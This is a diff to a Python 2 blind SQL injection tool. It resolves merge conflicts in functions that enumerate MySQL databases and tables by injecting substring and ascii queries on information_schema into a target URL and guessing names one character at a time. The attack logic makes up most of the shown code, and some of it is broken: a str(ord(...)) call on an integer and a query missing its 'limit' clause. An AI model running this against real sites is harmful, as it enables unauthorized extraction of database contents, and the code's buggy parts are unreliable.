@@ -107,10 +107,6 @@ def eunum_databases(url, payload, bypass):
     while (database_increment < 64):
         # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
         uri = url + str(payload) + "substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
-<<<<<<< HEAD
-        print str(uri)
-        server_response = request_handler(uri)
-=======
         # print str(uri)
         # server_response = request_handler(uri)
         try:
@@ -120,7 +116,6 @@ def eunum_databases(url, payload, bypass):
             database_increment -= 1
             continue
 
->>>>>>> 4938c2d4fea48c6ce2d1dd516072c74a0b65fbe7
         server_response_status = validate_request(server_response)
 
         # If status is false then we know the number of databases
@@ -197,7 +192,6 @@ def enum_tables(url, payload, bypass):
             TODO
         '''
 
-<<<<<<< HEAD
         for database in dump.keys():
             print database
 
@@ -244,52 +238,6 @@ def enum_tables(url, payload, bypass):
                                             break
 
                             # elif server_response_status is True:
-=======
-        tables_increment = 0
-
-        # Count how many databases, we assume there are less than 64 databases
-        while (tables_increment < 64):
-            # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_increment) + ",1),1,1)>=0" + bypass
-            uri = url + str(payload) + "substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit " + str(tables_increment) + ",1),1,1)>=0" + bypass
-            server_response = request_handler(uri)
-            server_response_status = validate_request(server_response)
-
-            # If status is false then we know the number of databases
-            if server_response_status is False:
-                print 'Found ' + str(tables_increment) + ' Tables'
-
-                # Count how many letters in each database name
-                for table_number in range(0,tables_increment):
-                    table_letter_count = 1
-
-                    # Count how many chars in db name, we assume the database name to be less than 128 characters
-                    while (table_letter_count < 128):
-                        # uri = url + "' and substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1),"+ str(database_letter_count) + ",1)>0" + bypass
-                        uri = url + str(payload) + "substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' " + str(table_number) + ",1),"+ str(table_letter_count) + ",1)>0" + bypass
-                        server_response = request_handler(uri)
-                        server_response_status = validate_request(server_response)
-
-                        if server_response_status is False:
-                            print 'Table ' + str(table_number) + ': has ' + str(table_letter_count) + ' letters'
-                            table_name = ""
-
-                            # Get the databases names
-                            for table_letter_count in range(1,table_letter_count):
-
-                                # Loop in ascii range to guess each character
-                                # Reduced range to improve performance
-                                for table_letter in range(33,127):
-                                    # uri = url + "' and ascii(substring((select schema_name from information_schema.schemata limit " + str(database_number) + ",1)," + str(database_letter_count) + ",1))>=" + str(database_letter) + bypass
-                                    uri = url + str(payload) + "ascii(substring((select table_name from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema' limit " + str(table_number) + ",1)," + str(table_letter_count) + ",1))>=" + str(table_letter) + bypass
-                                    server_response = request_handler(uri)
-                                    server_response_status = validate_request(server_response)
-
-                                    # If status is false then database_letter - 1 was the n-th char of the database name
-                                    if server_response_status is False:
-                                        table_name = table_name + str(ord(table_letter - 1))
-
-                        elif server_response_status is True:
->>>>>>> 4938c2d4fea48c6ce2d1dd516072c74a0b65fbe7
                             table_letter_count = table_letter_count + 1
 
                         print table_name
